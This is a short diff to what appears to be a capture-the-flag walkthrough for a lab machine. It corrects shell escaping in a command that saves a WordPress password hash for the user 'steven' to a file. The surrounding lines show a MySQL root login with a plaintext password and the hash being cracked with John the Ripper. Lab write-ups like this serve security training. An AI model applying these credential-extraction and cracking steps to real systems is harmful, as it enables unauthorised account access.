@@ -125,10 +125,13 @@ $ mysql wordpress --user=root -pR@v3nSecurity
 exit
 ```
 ```
-echo "steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/" > hash.txt
+echo "steven:\$P\$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/" > hash.txt
 ```
 ```
 john hash.txt
+```
+```
+exit
 ```
 ```
 exit
